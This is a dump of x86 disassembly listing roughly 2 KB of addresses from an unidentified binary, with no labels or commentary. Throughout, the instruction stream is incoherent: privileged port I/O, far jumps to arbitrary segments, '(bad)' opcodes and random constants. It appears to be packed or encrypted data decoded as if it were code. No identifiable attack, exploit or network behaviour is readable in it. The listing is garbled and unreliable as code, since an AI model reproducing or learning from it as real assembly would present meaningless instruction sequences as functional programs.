  4197d8:	pop    esp
  4197d9:	adc    ch,BYTE PTR [ebx+0x4321048d]
  4197df:	in     eax,dx
  4197e0:	cmc    
  4197e1:	sbb    dh,bl
  4197e3:	test   DWORD PTR [ebx-0x1b],ebp
  4197e6:	sub    ch,BYTE PTR [esi]
  4197e8:	adc    esp,DWORD PTR [edi+edx*2-0x5a762b26]
  4197ef:	dec    esi
  4197f0:	xor    DWORD PTR [esi+0x1],ebx
  4197f3:	or     al,0xda
  4197f5:	cmc    
  4197f6:	pop    esi
  4197f7:	xchg   edx,eax
  4197f8:	mov    ecx,0x63b33b16
  4197fd:	push   eax
  4197fe:	sub    ah,BYTE PTR [ebx]
  419800:	popa   
  419801:	std    
  419802:	xor    bh,dh
  419804:	and    DWORD PTR [eax-0x580cfbcb],edx
  41980a:	test   eax,0xea8a8966
  41980f:	pop    es
  419810:	adc    edx,DWORD PTR [ebx-0x74]
  419813:	pop    eax
  419814:	aam    0x43
  419816:	in     eax,dx
  419817:	paddb  mm6,QWORD PTR [esi+edx*4]
  41981b:	pop    edi
  41981c:	les    esp,FWORD PTR [ebp+0x41]
  41981f:	mov    esp,0x2c671a76
  419824:	ins    BYTE PTR es:[edi],dx
  419825:	mov    edi,0x679ec5e5
  41982a:	inc    eax
  41982b:	mov    esp,0x2f6a2678
  419830:	pop    ss
  419831:	lods   al,BYTE PTR ds:[esi]
  419832:	jge    0x41985e
  419834:	lods   eax,DWORD PTR ds:[esi]
  419835:	pushf  
  419836:	and    ch,cl
  419838:	inc    ebx
  419839:	adc    ah,BYTE PTR [ecx+ebp*4]
  41983c:	or     esp,DWORD PTR [ebp-0x3119fa1b]
  419842:	push   0x50
  419844:	jb     0x419803
  419846:	sti    
  419847:	imul   ecx,DWORD PTR [edx-0x36f9924b],0x8c0246d
  419851:	clc    
  419852:	push   ds
  419853:	mov    cl,0x12
  419855:	popf   
  419856:	dec    edi
  419857:	in     al,0xef
  419859:	test   al,0x4c
  41985b:	repz mov edi,0xb23e5583
  419861:	mov    edi,0xa978dbd2
  419866:	or     eax,0x8becf14d
  41986b:	outs   dx,BYTE PTR ds:[esi]
  41986c:	mov    BYTE PTR [ebp-0x301baded],bl
  419872:	cmp    edi,DWORD PTR [ebp+0x51]
  419875:	mov    ds:0x55bcc866,eax
  41987a:	mov    al,0x6e
  41987c:	sub    dl,BYTE PTR [esp+esi*2-0x71198704]
  419883:	call   0xcd7a:0xe81b92ee
  41988a:	mov    bl,0x90
  41988c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41988d:	outs   dx,BYTE PTR ds:[esi]
  41988e:	(bad)  
  419890:	adc    dl,bh
  419892:	pop    ss
  419893:	in     eax,0xb8
  419895:	in     eax,0x15
  419897:	xor    esp,ebp
  419899:	nop    edx
  41989c:	xor    ebx,DWORD PTR [edx-0x27]
  41989f:	scas   al,BYTE PTR es:[edi]
  4198a0:	xchg   ebx,eax
  4198a1:	mov    WORD PTR [edx-0x6f61eed3],fs
  4198a7:	mov    dh,ah
  4198a9:	sub    DWORD PTR [eax],ebp
  4198ab:	push   esi
  4198ac:	rcr    BYTE PTR [edi],1
  4198ae:	or     al,0x0
  4198b0:	dec    esp
  4198b1:	cdq    
  4198b2:	xchg   esi,eax
  4198b3:	bound  ebp,QWORD PTR [eax-0x534bed27]
  4198b9:	inc    esi
  4198ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198bb:	dec    ebx
  4198bc:	out    0x74,al
  4198be:	cmp    ah,al
  4198c0:	cmp    ebp,0x15
  4198c3:	adc    al,0x1f
  4198c5:	icebp  
  4198c6:	in     eax,dx
  4198c7:	ins    DWORD PTR es:[edi],dx
  4198c8:	repz jnp 0x41987e
  4198cb:	or     DWORD PTR [eax+0x41],edx
  4198ce:	cld    
  4198cf:	cmp    dl,dh
  4198d1:	cwde   
  4198d2:	mov    esi,0x7b86b14
  4198d7:	cld    
  4198d8:	add    al,0x8f
  4198da:	mov    ?,WORD PTR [ecx-0x7a]
  4198dd:	test   eax,0x4fdc01d1
  4198e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198e3:	jns    0x419880
  4198e5:	sbb    ebp,DWORD PTR [edi+ebp*1-0x64]
  4198e9:	imul   DWORD PTR [esi-0x59]
  4198ec:	cmp    BYTE PTR [edi],ch
  4198ee:	std    
  4198ef:	outs   dx,DWORD PTR ds:[esi]
  4198f0:	retf   
  4198f1:	push   edi
  4198f2:	sti    
  4198f3:	sub    BYTE PTR [edi+0x76e0fce4],cl
  4198f9:	popa   
  4198fa:	es dec ebp
  4198fc:	and    esi,0x64
  4198ff:	sub    DWORD PTR [esi-0x13],0x7c
  419903:	into   
  419904:	add    al,0x75
  419906:	mov    ebx,0x5c321446
  41990b:	(bad)  
  41990c:	xor    cl,BYTE PTR [edi-0x28]
  41990f:	cld    
  419910:	mov    ds:0xe6bd80d9,al
  419915:	outs   dx,DWORD PTR ds:[esi]
  419916:	retf   
  419917:	es je  0x419944
  41991a:	outs   dx,DWORD PTR ds:[esi]
  41991b:	fidiv  WORD PTR [edx]
  41991d:	mov    bh,0x2f
  41991f:	popa   
  419920:	sub    DWORD PTR cs:[ecx],eax
  419923:	aad    0xeb
  419925:	xor    al,BYTE PTR [esi]
  419927:	jmp    0xd28d214e
  41992c:	sbb    BYTE PTR [eax-0x17],bl
  41992f:	les    esp,FWORD PTR [esp+ecx*8+0x66ae7551]
  419936:	stos   DWORD PTR es:[edi],eax
  419937:	lahf   
  419938:	pop    edx
  419939:	mov    ebp,0xa7ba7997
  41993e:	xchg   ebp,eax
  41993f:	jo     0x419952
  419941:	fwait
  419942:	and    bl,BYTE PTR [ebx+0x22]
  419945:	cmp    BYTE PTR [ebp-0x7d],dl
  419948:	mov    ds:0xa1c12c4d,eax
  41994d:	enter  0x8183,0x7c
  419951:	mov    ch,0xb6
  419953:	shr    DWORD PTR [ecx+0x426f7b23],1
  419959:	mov    bl,0xd1
  41995b:	aam    0x1a
  41995d:	sbb    ebx,DWORD PTR ds:0x9e211fc5
  419963:	sub    eax,0x57b362ec
  419968:	mov    gs,WORD PTR [eax+0x5fc44c41]
  41996e:	mov    dh,0x5b
  419970:	sub    BYTE PTR [eax-0x48],ch
  419973:	std    
  419974:	in     eax,0x69
  419976:	int    0x36
  419978:	(bad)  
  419979:	lock jmp 0x419942
  41997c:	or     esp,DWORD PTR [edx+edi*1-0x34cfb938]
  419983:	mov    ebp,0x17ce5514
  419988:	shl    bl,cl
  41998a:	daa    
  41998b:	sbb    ebx,DWORD PTR [eax-0x7cef6e73]
  419991:	mov    cl,0xe6
  419993:	outs   dx,DWORD PTR ds:[esi]
  419994:	out    0x89,eax
  419996:	pop    edx
  419997:	(bad)  
  419998:	cld    
  419999:	xor    al,0xb6
  41999b:	cmp    DWORD PTR [ebp-0x5e],0xa12e9e15
  4199a2:	aad    0x15
  4199a4:	pop    esp
  4199a5:	out    0xd3,al
  4199a7:	adc    al,0x57
  4199a9:	fdivr  DWORD PTR [ecx-0x4b6f1983]
  4199af:	pop    edi
  4199b0:	sub    DWORD PTR [edi-0x5754ec81],eax
  4199b6:	pop    esi
  4199b7:	adc    ecx,eax
  4199b9:	addr16 retf 0x7b06
  4199bd:	jmp    0xab6f:0xa5d74a1b
  4199c4:	xor    eax,0xc2c1f8e4
  4199c9:	xchg   ebx,eax
  4199ca:	or     al,0xbd
  4199cc:	and    esp,esp
  4199ce:	jae    0x4199d7
  4199d0:	in     al,0x4a
  4199d2:	ror    DWORD PTR [edx],0xf7
  4199d5:	(bad)  
  4199d6:	pop    ebp
  4199d7:	shr    ah,1
  4199d9:	and    ebp,DWORD PTR [ecx]
  4199db:	retf   
  4199dc:	mov    ds:0xb5949629,eax
  4199e1:	fisttp WORD PTR ds:0xe61dd579
  4199e7:	push   eax
  4199e8:	mov    dl,0xb1
  4199ea:	not    BYTE PTR [eax+0x4]
  4199ed:	sbb    dh,BYTE PTR [ebp+0x9]
  4199f0:	push   eax
  4199f1:	push   ecx
  4199f2:	and    edx,DWORD PTR [ecx]
  4199f4:	dec    eax
  4199f5:	fdivrp st(4),st
  4199f7:	jl     0x4199f1
  4199f9:	xor    eax,esp
  4199fb:	xor    DWORD PTR [ecx-0x6a],edx
  4199fe:	mov    DWORD PTR [ecx-0x2b2dffa1],0xdba5f543
  419a08:	mov    ebx,0xf672abff
  419a0d:	xchg   ebx,eax
  419a0e:	shr    DWORD PTR [edi+ebx*2],1
  419a11:	outs   dx,BYTE PTR ds:[esi]
  419a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a13:	mov    esi,0x6d9e4c06
  419a18:	add    dh,BYTE PTR [eax]
  419a1a:	nop
  419a1b:	xlat   BYTE PTR ds:[ebx]
  419a1c:	mov    esi,0x8ef3e54b
  419a21:	fbld   TBYTE PTR [ebp-0x67]
  419a24:	mov    dl,0x4b
  419a26:	les    eax,FWORD PTR [ebp+0x24]
  419a29:	push   esp
  419a2a:	popa   
  419a2b:	mov    ds:0x3d141445,al
  419a30:	xchg   DWORD PTR [ebp+ebp*8-0x77],ebx
  419a34:	sbb    al,0xa4
  419a36:	sbb    DWORD PTR [esi-0x7102db06],edi
  419a3c:	repz mov ebp,0xca29e500
  419a42:	mov    eax,0x5b6d890e
  419a47:	sbb    BYTE PTR [edx],ch
  419a49:	push   eax
  419a4a:	sbb    eax,0x43688869
  419a4f:	sbb    al,0x39
  419a51:	jp     0x419aa4
  419a53:	xor    edi,ebp
  419a55:	lods   eax,DWORD PTR ds:[esi]
  419a56:	sub    esi,ecx
  419a58:	push   0x1e
  419a5a:	or     al,0x58
  419a5c:	pop    ss
  419a5d:	loopne 0x419ac3
  419a5f:	scas   al,BYTE PTR es:[edi]
  419a60:	mov    ds:0xdd5afa,al
  419a65:	sub    al,BYTE PTR [ebp+0x7]
  419a68:	out    0x5,al
  419a6a:	inc    ebp
  419a6b:	inc    edx
  419a6c:	fiadd  DWORD PTR [eax+0x72fcee8f]
  419a72:	and    dh,dh
  419a74:	mov    ebx,0xdf07d0e2
  419a79:	(bad)
  419a7d:	arpl   WORD PTR [ecx],bx
  419a7f:	adc    BYTE PTR [edx+0x368b009b],bh
  419a85:	adc    esi,DWORD PTR [eax]
  419a87:	dec    edx
  419a88:	xchg   ebx,eax
  419a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a8a:	stc    
  419a8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a8c:	add    bh,BYTE PTR [edi+0x43]
  419a8f:	adc    DWORD PTR [edx-0xb885580],0xd246bff1
  419a99:	jmp    0x419a7a
  419a9b:	ret    
  419a9c:	sbb    esi,0x1abeba63
  419aa2:	ins    DWORD PTR es:[edi],dx
  419aa3:	jmp    0xb7f40181
  419aa8:	addr16 repnz popa 
  419aab:	and    eax,0xe7614d29
  419ab0:	call   FWORD PTR [ecx]
  419ab2:	mov    al,BYTE PTR [esi]
  419ab4:	mov    DWORD PTR [esi+0x71],ebp
  419ab7:	cs xor ecx,edx
  419aba:	sub    al,0xb5
  419abc:	es in  eax,dx
  419abe:	jno    0x419b15
  419ac0:	loop   0x419a91
  419ac2:	clc    
  419ac3:	adc    edi,ebx
  419ac5:	sub    al,0xb7
  419ac7:	popf   
  419ac8:	das    
  419ac9:	pop    eax
  419aca:	xchg   esi,eax
  419acb:	shl    edi,cl
  419acd:	pop    DWORD PTR [ebx+0x69b9fbf6]
  419ad3:	sbb    al,0xc2
  419ad5:	shr    eax,1
  419ad7:	dec    ebx
  419ad8:	mov    edi,DWORD PTR [edx]
  419ada:	js     0x419afe
  419adc:	adc    eax,0xe2f5ec83
  419ae1:	push   edi
  419ae2:	dec    ebx
  419ae3:	nop
  419ae4:	sbb    al,0x41
  419ae6:	(bad)  [eax+0x62]
  419ae9:	sub    DWORD PTR [edx-0x1cd8addf],edi
  419aef:	mov    al,0xf4
  419af1:	mov    eax,DWORD PTR [esi-0x1e]
  419af4:	dec    ecx
  419af5:	inc    edx
  419af6:	enter  0x1f94,0xdb
  419afa:	push   esi
  419afb:	popa   
  419afc:	adc    DWORD PTR [ebx-0x39da3f89],ebp
  419b02:	xlat   BYTE PTR ds:[ebx]
  419b03:	jp     0x419b7f
  419b05:	ins    BYTE PTR es:[edi],dx
  419b06:	js     0x419b35
  419b08:	mov    es,WORD PTR [ebp-0x60c5ca19]
  419b0e:	call   0x3de8:0x9a039760
  419b15:	test   BYTE PTR [ebx-0x190b6168],0xc4
  419b1c:	pushf  
  419b1d:	out    0x2f,eax
  419b1f:	push   cs
  419b20:	test   ch,0x6a
  419b23:	jae    0x419ac5
  419b25:	mov    esp,DWORD PTR [ebp+0x0]
  419b28:	imul   DWORD PTR [edi-0x16306cba]
  419b2e:	dec    esp
  419b2f:	dec    edx
  419b30:	popa   
  419b31:	push   0xffffffdf
  419b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b34:	inc    edx
  419b35:	jge    0x419b07
  419b37:	ror    BYTE PTR [ebp+0x40674df4],1
  419b3d:	sti    
  419b3e:	mov    BYTE PTR [edx],dl
  419b40:	sub    al,0x9e
  419b42:	mov    BYTE PTR [edi],0x8a
  419b45:	ins    BYTE PTR es:[edi],dx
  419b46:	sbb    eax,0x1f7978da
  419b4b:	jbe    0x419b8c
  419b4d:	pusha  
  419b4e:	inc    esp
  419b4f:	cmc    
  419b50:	je     0x419ada
  419b52:	ins    DWORD PTR es:[edi],dx
  419b53:	adc    BYTE PTR [edi-0x14e9c95d],0x23
  419b5a:	ret    0xdb9b
  419b5d:	loop   0x419bd3
  419b5f:	ret    
  419b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b61:	xchg   ebp,eax
  419b62:	pop    ebp
  419b63:	sub    eax,0x1721964
  419b68:	dec    ebx
  419b69:	es mov eax,esp
  419b6c:	test   BYTE PTR [esp+eax*8+0x1b],ah
  419b70:	mov    edx,0x62865f6b
  419b75:	pop    ebx
  419b76:	jo     0x419b23
  419b78:	outs   dx,BYTE PTR ds:[esi]
  419b79:	aas    
  419b7a:	addr16 cs cld 
  419b7d:	dec    ebp
  419b7e:	mov    bh,0xa8
  419b80:	cmc    
  419b81:	fadd   st(6),st
  419b83:	lods   eax,DWORD PTR ds:[esi]
  419b84:	pop    ecx
  419b85:	dec    edi
  419b86:	inc    esi
  419b87:	jmp    0x419b85
  419b89:	mov    dh,0xc1
  419b8b:	jg     0x419b40
  419b8d:	jno    0x419b6b
  419b8f:	jp     0x419b18
  419b91:	cwde   
  419b92:	(bad)  
  419b93:	adc    edi,eax
  419b95:	pop    ss
  419b96:	mov    edx,0x2dda6213
  419b9b:	pop    edx
  419b9c:	das    
  419b9d:	psraw  xmm5,XMMWORD PTR [ecx-0xb]
  419ba2:	retf   0xee6
  419ba5:	add    al,0xa3
  419ba7:	cmc    
  419ba8:	cmp    BYTE PTR ds:0xb7eb876e,al
  419bae:	sahf   
  419baf:	add    BYTE PTR [ebx],al
  419bb1:	and    BYTE PTR [edi],al
  419bb3:	mov    al,0x2f
  419bb5:	cdq    
  419bb6:	sub    al,0xee
  419bb8:	ja     0x419bf1
  419bba:	sub    BYTE PTR ds:0xe4ed5ac9,ah
  419bc0:	cdq    
  419bc1:	pushf  
  419bc2:	mov    edx,0xe743dc7b
  419bc7:	out    dx,eax
  419bc8:	dec    edx
  419bc9:	jae    0x419b76
  419bcb:	(bad)  
  419bcc:	jae    0x419c29
  419bce:	inc    ebx
  419bcf:	sub    DWORD PTR [ebx+0x66c95939],esp
  419bd5:	sub    al,ah
  419bd7:	jg     0x419c11
  419bd9:	or     cl,cl
  419bdb:	add    DWORD PTR [edi+0x6850c9c5],eax
  419be1:	xchg   edx,eax
  419be2:	lock pop edx
  419be4:	and    al,0x6
  419be6:	scas   al,BYTE PTR es:[edi]
  419be7:	out    dx,eax
  419be8:	ret    0xffa7
  419beb:	loopne 0x419b82
  419bed:	mov    eax,ds:0x2712dfb0
  419bf2:	adc    dl,dh
  419bf4:	iretw  
  419bf6:	repz pusha 
  419bf8:	mov    edi,0xdb172974
  419bfd:	lahf   
  419bfe:	and    ebx,ebx
  419c00:	retf   
  419c01:	sbb    al,0xcb
  419c03:	int    0x20
  419c05:	lods   eax,DWORD PTR ds:[esi]
  419c06:	frstor [ecx]
  419c08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c09:	sbb    ecx,DWORD PTR [ecx]
  419c0b:	cmp    DWORD PTR [eax+0x5a],0x526932ba
  419c12:	ret    
  419c13:	add    eax,0xf99a1dc6
  419c18:	shl    BYTE PTR [edx+0x50],1
  419c1b:	loopne 0x419c07
  419c1d:	xchg   edx,eax
  419c1e:	mov    eax,ds:0x6399a41e
  419c23:	dec    ebx
  419c24:	test   al,0x9e
  419c26:	cmp    eax,0x99a0b8c8
  419c2b:	dec    ax
  419c2d:	shl    BYTE PTR [edx-0x27],0xb
  419c31:	cmp    dl,al
  419c33:	xlat   BYTE PTR ds:[ebx]
  419c34:	lods   eax,DWORD PTR ds:[esi]
  419c35:	sbb    al,0xc
  419c37:	stos   DWORD PTR es:[edi],eax
  419c38:	mov    ebp,0xaf2ee6ea
  419c3d:	or     eax,0x1084b3e2
  419c42:	fild   QWORD PTR [esp+eax*4]
  419c45:	sbb    al,0x0
  419c47:	sub    eax,0x735dc90f
  419c4c:	xchg   DWORD PTR [esi-0x6],ebx
  419c4f:	pop    edx
  419c50:	fidiv  DWORD PTR [edi+0x41]
  419c53:	xchg   ebp,eax
  419c54:	add    al,0x46
  419c56:	or     al,0xf6
  419c58:	mov    al,0x44
  419c5a:	ret    0xa7d1
  419c5d:	shr    edx,cl
  419c5f:	dec    esp
  419c60:	pushf  
  419c61:	pop    edi
  419c62:	cmp    bl,BYTE PTR [eax-0x67d4853b]
  419c68:	sub    BYTE PTR [ecx-0x74],0x84
  419c6c:	and    ebp,DWORD PTR [edi-0x4ecd5520]
  419c72:	pop    ebp
  419c73:	mov    bh,0x9e
  419c75:	or     al,0x8e
  419c78:	adc    esi,edx
  419c7a:	push   cs
  419c7b:	pop    ebx
  419c7c:	push   edx
  419c7d:	dec    ebp
  419c7e:	pop    es
  419c7f:	mov    bl,0x39
  419c81:	mov    ebp,gs
  419c83:	fwait
  419c84:	dec    edi
  419c85:	xchg   edx,eax
  419c86:	inc    esp
  419c87:	inc    eax
  419c88:	and    DWORD PTR [ecx-0x7723f3fb],ebp
  419c8e:	or     al,0x4b
  419c90:	pop    ds
  419c91:	dec    eax
  419c92:	(bad)  
  419c93:	pop    ebx
  419c94:	pop    ss
  419c95:	pop    es
  419c96:	pop    esi
  419c97:	mov    al,ds:0x3f2fd41b
  419c9c:	test   DWORD PTR [edi+0x51c68a3b],ebp
  419ca2:	or     DWORD PTR [eax+ebx*2-0x1e84c632],edx
  419ca9:	xor    al,0x83
  419cab:	push   cs
  419cac:	pop    ecx
  419cad:	ror    ah,1
  419caf:	call   0xa1002b96
  419cb4:	inc    edx
  419cb5:	push   0x57c129c7
  419cba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cbb:	mov    al,ds:0xd1ff74e9
  419cc0:	mov    edx,0x3a59400f
  419cc5:	jae    0x419cab
  419cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cc8:	and    edi,DWORD PTR gs:[edi]
  419ccb:	test   BYTE PTR [ecx],0xd6
  419cce:	jo     0x419cb3
  419cd0:	call   0xd11a76d3
  419cd5:	std    
  419cd6:	stos   BYTE PTR es:[edi],al
  419cd7:	push   edi
  419cd8:	out    0x1c,eax
  419cda:	cmc    
  419cdb:	in     al,dx
  419cdc:	xchg   ebp,eax
  419cdd:	mov    bh,0xd
  419cdf:	xor    dh,BYTE PTR [eax-0x3e]
  419ce2:	jl     0x419d4c
  419ce4:	addr16 add eax,0x35eaca78
  419cea:	add    al,0x8e
  419cec:	inc    esp
  419ced:	add    esp,DWORD PTR [esp+eax*8]
  419cf0:	stos   BYTE PTR es:[edi],al
  419cf1:	aad    0x3d
  419cf3:	nop
  419cf4:	or     DWORD PTR [ebx+eiz*8+0x47d93642],esp
  419cfb:	clts   
  419cfd:	test   al,0x8
  419cff:	cli    
  419d00:	push   ebx
  419d01:	cmp    ecx,DWORD PTR [ecx-0x64]
  419d04:	inc    eax
  419d05:	xchg   BYTE PTR [ebx+0x3b96df4f],cl
  419d0b:	es push ss
  419d0d:	push   cs
  419d0e:	ret    0x7b8d
  419d11:	pop    ecx
  419d12:	fs jmp 0xc6b7:0x9c00ad43
  419d1a:	out    dx,eax
  419d1b:	pop    es
  419d1c:	aad    0x4d
  419d1e:	jl     0x419d70
  419d20:	and    al,0xef
  419d22:	xor    dh,ah
  419d24:	xor    al,0x77
  419d26:	dec    esp
  419d27:	dec    BYTE PTR [edi-0x1e]
  419d2a:	inc    ecx
  419d2b:	popa   
  419d2c:	outs   dx,DWORD PTR ds:[esi]
  419d2d:	cli    
  419d2e:	ret    0x3a0d
  419d31:	call   0x4db8:0x2b223d99
  419d38:	or     bh,al
  419d3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d3b:	data16 sub al,0xe1
  419d3e:	fsubr  QWORD PTR [edi]
  419d40:	mov    ch,0xe2
  419d42:	jmp    0xfd92566b
  419d47:	and    al,0x67
  419d49:	loope  0x419cd4
  419d4b:	pusha  
  419d4c:	sbb    DWORD PTR [edx+0x2e790348],edx
  419d52:	sbb    eax,0x9332b4f7
  419d57:	ins    BYTE PTR es:[edi],dx
  419d58:	xchg   esp,eax
  419d59:	push   ecx
  419d5a:	nop
  419d5b:	mov    eax,ds:0xc70fb7be
  419d60:	xchg   edx,eax
  419d61:	inc    edx
  419d62:	enter  0x67f7,0x5a
  419d66:	pop    edx
  419d67:	cld    
  419d68:	arpl   WORD PTR [ebx+0x6c],ax
  419d6b:	add    bh,0x85
  419d6e:	aas    
  419d6f:	inc    edi
  419d70:	jo     0x419d34
  419d72:	je     0x419d68
  419d74:	in     eax,0x13
  419d76:	lods   eax,DWORD PTR ds:[esi]
  419d77:	jg     0x419d1e
  419d79:	sub    ah,bh
  419d7b:	mov    esp,eax
  419d7d:	js     0x419dc2
  419d7f:	ja     0x419db5
  419d81:	jg     0x419d83
  419d83:	cmp    al,bh
  419d85:	push   edx
  419d86:	mov    ds:0xe917b4d5,al
  419d8b:	xor    al,0x7f
  419d8d:	adc    al,0x66
  419d8f:	xchg   ebx,eax
  419d90:	push   ds
  419d91:	and    ebx,DWORD PTR [eax]
  419d93:	pop    ebp
  419d94:	lds    ebp,FWORD PTR [edx+0x71e266dd]
  419d9a:	fs push ds
  419d9c:	(bad)  
  419d9d:	mov    bh,0x77
  419d9f:	mov    BYTE PTR [esi+0x2805da67],dh
  419da5:	faddp  st(4),st
  419da7:	xlat   BYTE PTR ds:[ebx]
  419da8:	test   eax,0xc5a4147b
  419dad:	push   ecx
  419dae:	pop    ebp
  419daf:	hlt    
  419db0:	sub    ecx,esi
  419db2:	pop    esi
  419db3:	sahf   
  419db4:	xchg   ecx,eax
  419db5:	sbb    DWORD PTR [edx+edx*1+0x73],0x5
  419dba:	(bad)  
  419dbb:	fdiv   DWORD PTR [edx+0x51e4f883]
  419dc1:	dec    esp
  419dc2:	mov    eax,ds:0x63e3981a
  419dc7:	mov    ?,ebp
  419dc9:	xlat   BYTE PTR ds:[ebx]
  419dca:	fistp  QWORD PTR [ecx]
  419dcc:	fimul  WORD PTR [ebx-0x4f]
  419dcf:	int3   
  419dd0:	(bad)  
  419dd1:	popf   
  419dd2:	sbb    DWORD PTR [eax+edi*2-0x76],esp
  419dd6:	imul   ebp,DWORD PTR [edx+0x7ef00ed5],0x7b
  419ddd:	cli    
  419dde:	xchg   esp,eax
  419ddf:	outs   dx,BYTE PTR ds:[esi]
  419de0:	out    0x82,al
  419de2:	in     eax,0xfb
  419de4:	(bad)
  419de8:	mov    bh,BYTE PTR [eax]
  419dea:	push   0xa9b1981d
  419def:	les    esi,FWORD PTR [edx+0x1bcc268]
  419df5:	jne    0x419e2d
  419df7:	push   esi
  419df8:	in     al,dx
  419df9:	dec    ebx
  419dfa:	push   ebp
  419dfb:	nop
  419dfc:	cdq    
  419dfd:	retf   
  419dfe:	push   ss
  419dff:	xchg   ecx,eax
  419e00:	pop    esi
  419e01:	int3   
  419e02:	xchg   WORD PTR gs:[edx+0x7414100d],ax
  419e0a:	dec    ebx
  419e0b:	mov    bl,ah
  419e0d:	or     DWORD PTR [esi],esp
  419e0f:	out    0xc9,al
  419e11:	std    
  419e12:	mov    esp,0xec84ed54
  419e17:	jg     0x419e86
  419e19:	arpl   WORD PTR [ecx+0x36a6b70a],cx
  419e1f:	mov    esp,0x1c2bfa2b
  419e24:	inc    ebp
  419e25:	int3   
  419e26:	popf   
  419e27:	fptan  
  419e29:	jmp    0x419dce
  419e2b:	imul   cl
  419e2d:	cdq    
  419e2e:	xchg   edi,eax
  419e2f:	jbe    0x419dd7
  419e31:	mov    bl,0xfc
  419e33:	lea    ebp,[ebx+0x1fbb3210]
  419e39:	adc    al,0xe2
  419e3b:	das    
  419e3c:	push   0x8b9f4527
  419e41:	mov    al,0xf3
  419e43:	xchg   edi,eax
  419e44:	xlat   BYTE PTR ds:[ebx]
  419e45:	push   ebp
  419e46:	sbb    cl,BYTE PTR [ecx]
  419e48:	cmp    eax,0xe7ea5a70
  419e4d:	mov    BYTE PTR [ebx],cl
  419e4f:	fiadd  DWORD PTR [esi]
  419e51:	pop    eax
  419e52:	push   esp
  419e53:	or     DWORD PTR [eax-0x11be38a6],ebp
  419e59:	(bad)  
  419e5a:	stos   BYTE PTR es:[edi],al
  419e5b:	mov    bl,0x73
  419e5d:	imul   edi,DWORD PTR [ebp+0x771951ee],0xffffffe2
  419e64:	sbb    eax,0xf93ca857
  419e69:	test   al,dl
  419e6b:	in     al,0x30
  419e6d:	and    DWORD PTR [edx],edi
  419e6f:	adc    eax,0x23578f61
  419e74:	mov    eax,ds:0x8c49d859
  419e79:	xchg   ebp,eax
  419e7a:	inc    eax
  419e7b:	nop
  419e7c:	clc    
  419e7d:	int3   
  419e7e:	push   cs
  419e7f:	push   cs
  419e80:	lea    ebp,[ebx]
  419e82:	and    ecx,esi
  419e84:	adc    DWORD PTR [ebx],edx
  419e86:	push   edx
  419e87:	adc    BYTE PTR [edx+edx*4+0x60],ch
  419e8b:	cmc    
  419e8c:	or     esp,DWORD PTR [ebx+0x26]
  419e8f:	xchg   esp,eax
  419e90:	repnz mov ds:0x734d13d8,al
  419e96:	mov    dh,0xbf
  419e98:	jo     0x419efa
  419e9a:	pushf  
  419e9b:	and    eax,0xfbdaa06
  419ea0:	xor    eax,DWORD PTR [ebp+0x31a2c866]
  419ea6:	mov    bl,0x37
  419ea8:	daa    
  419ea9:	cmp    eax,DWORD PTR [ecx+0x473bde84]
  419eaf:	out    dx,eax
  419eb0:	mov    eax,0xfbd23515
  419eb5:	inc    ecx
  419eb6:	dec    esp
  419eb7:	repnz (bad) 
  419eb9:	fdiv   DWORD PTR [esi]
  419ebb:	push   esi
  419ebc:	mov    DWORD PTR [ecx+0x1a],ebp
  419ebf:	or     DWORD PTR [ebx+0x7db176db],0x4e
  419ec6:	or     DWORD PTR [eax+0x20290105],0xbe875873
  419ed0:	fimul  DWORD PTR ds:0x53cee0df
  419ed6:	push   edi
  419ed7:	pop    esi
  419ed8:	xchg   ecx,eax
  419ed9:	mov    al,ds:0xe1684fdb
  419ede:	xor    DWORD PTR [edi+0x4b665f0f],0x72
  419ee5:	outs   dx,DWORD PTR ds:[esi]
  419ee6:	adc    eax,0x697a8a74
  419eeb:	sbb    al,0x60
  419eed:	test   esi,edi
  419eef:	mov    ecx,0xf16b8e98
  419ef4:	pop    esp
  419ef5:	or     eax,0x78bbe392
  419efa:	in     eax,0xee
  419efc:	fs addr16 out 0x3e,eax
  419f00:	lahf   
  419f01:	std    
  419f02:	add    DWORD PTR [eax],ebx
  419f04:	push   cs
  419f05:	out    dx,eax
  419f06:	xchg   DWORD PTR [ebx-0x5c],ebx
  419f09:	es cmp cl,ah
  419f0c:	inc    ebp
  419f0d:	mov    al,ds:0x7e8dfae8
  419f12:	mov    dl,0xe6
  419f14:	mov    edx,0x89bb814e
  419f19:	sub    esp,DWORD PTR [edx]
  419f1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f1c:	xor    ecx,esp
  419f1e:	fsubr  QWORD PTR [ebx+0x2b]
  419f21:	dec    ebp
  419f22:	aam    0x8d
  419f24:	jo     0x419eb6
  419f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f27:	sti    
  419f28:	mov    edx,0x8639cd96
  419f2d:	mov    bl,0xcb
  419f2f:	rcl    BYTE PTR [esi-0x6f],0x9d
  419f33:	fmul   DWORD PTR [esp+esi*2-0x43]
  419f37:	add    esi,esp
  419f39:	ret    0x65da
  419f3c:	mov    ah,0xca
  419f3e:	in     eax,dx
  419f3f:	pop    esp
  419f41:	jne    0x419f90
  419f43:	iret   
  419f44:	pop    es
  419f45:	add    al,0x52
  419f47:	push   eax
  419f48:	leave  
  419f49:	jmp    0x6943:0x693bf3b0
  419f50:	jle    0x419f3c
  419f52:	add    al,0x68
  419f54:	mov    al,0x69
  419f56:	mov    ah,0x49
  419f58:	(bad)  
  419f59:	sub    ebx,DWORD PTR ds:0xd96e7ec8
  419f5f:	ret    0xac52
  419f62:	les    esp,FWORD PTR [ebx+0x3822ee11]
  419f68:	(bad)  
  419f6a:	push   ds
  419f6b:	fistp  QWORD PTR [esi-0x65]
  419f6e:	dec    esi
  419f6f:	std    
  419f70:	lock es (bad) 
  419f73:	mov    eax,0x9e37050a
  419f78:	push   esp
